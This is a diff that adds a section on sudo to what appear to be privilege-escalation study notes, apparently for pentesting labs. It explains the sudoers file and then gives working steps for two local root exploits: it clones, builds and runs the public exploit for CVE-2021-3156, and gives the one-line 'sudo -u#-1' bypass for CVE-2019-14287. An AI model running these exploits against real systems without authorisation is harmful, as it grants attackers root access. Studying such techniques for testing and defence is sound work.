@@ -2309,3 +2309,45 @@ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
 ```
 
 ---
+
+# Sudo 
+
+## 📌 What is Sudo?
+- Runs commands with elevated privileges (usually root).
+- Controlled via `/etc/sudoers`.
+- Adds security by restricting access to sensitive commands.
+
+
+## ⚙️ Sudoers File Example
+```bash
+cry0l1t3 ALL=(ALL) /usr/bin/id
+```
+- Grants user `cry0l1t3` permission to run `/usr/bin/id` as root.
+
+
+
+## 🛠️ CVE-2021-3156 – Heap Overflow
+- Affects sudo versions like 1.8.31 (Ubuntu 20.04).
+- Exploit allows root shell via buffer overflow in `sudoedit`.
+
+### Steps:
+```bash
+sudo -V
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156 && make
+./sudo-hax-me-a-sandwich 1
+# id → uid=0(root)
+```
+
+
+## 🚨 CVE-2019-14287 – Policy Bypass
+- Affects sudo < 1.8.28.
+- Exploit: `sudo -u#-1 command` runs as root.
+
+### Example:
+```bash
+sudo -u#-1 id
+# uid=0(root)
+```
+
+---
